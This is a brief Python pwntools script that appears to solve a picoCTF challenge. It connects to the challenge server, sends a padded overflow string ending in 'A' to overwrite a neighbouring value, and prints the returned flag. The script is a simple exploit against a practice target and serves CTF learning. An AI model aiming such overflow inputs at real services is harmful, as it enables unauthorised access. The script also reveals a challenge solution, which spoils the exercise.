from pwn import *

conn = "nc saturn.picoctf.net 58921"
host = conn.split(" ")[1]
port = conn.split(" ")[2]

p = remote(host, port)

p.sendline(b"aaaabbbbccccddddeeeeffffA")
f = p.recvall()
flag = f.decode().split("picoCTF")
print("picoCTF" + flag[1])
